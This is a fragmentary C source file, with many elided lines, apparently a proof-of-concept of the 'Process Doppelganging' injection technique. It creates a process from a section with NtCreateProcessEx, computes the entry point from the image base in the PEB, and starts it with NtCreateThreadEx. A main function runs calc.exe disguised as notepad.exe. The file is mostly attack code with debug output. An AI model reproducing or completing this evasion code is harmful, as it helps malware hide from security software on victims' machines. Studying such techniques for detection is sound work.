    ...
    _In_ LPWSTR lpPayloadApp)
{
    ...
    do {
        ...
        if (!NT_SUCCESS(status)) {
            printf("NtCreateProcessEx(hSection) failed with status: 0x%X\n", status);
            break;
        }
        printf("[DEBUG] NtCreateProcessEx succeeded, hProcess: 0x%p\n", hProcess);
 ...
 //       EntryPoint = (ULONG_PTR)RtlImageNtHeader(Buffer)->OptionalHeader.AddressOfEntryPoint;
        ...
        printf("[DEBUG] RVA EntryPoint: 0x%llX\n", EntryPoint);
		
        ULONG_PTR ImageBase = (ULONG_PTR)((PPEB)temp)->ImageBaseAddress;
        printf("[DEBUG] ImageBase: 0x%llX\n", ImageBase);
		EntryPoint += ImageBase;
        printf("[DEBUG] Final EntryPoint: 0x%llX\n", EntryPoint);
        //
        ...
        //
        hThread = NULL;
        printf("[DEBUG] Creating thread with EntryPoint: 0x%llX\n", EntryPoint);
        status = NtCreateThreadEx(&hThread,
            ...
            NULL,
            FALSE,  // Don't suspend, start immediately
            0,
            0,
            0,
            NULL);
        if (!NT_SUCCESS(status)) {
            printf("NtCreateThreadEx(EntryPoint) failed with status: 0x%X\n", status);
            printf("  EntryPoint: 0x%llX\n", EntryPoint);
            printf("  Process Handle: 0x%p\n", hProcess);
            break;
        }
        printf("[DEBUG] Thread created and started successfully: 0x%p\n", hThread);
...
void main()
{
    ProcessDoppelganging(L".\\notepad.exe", L".\\calc.exe");
    ExitProcess(0);
}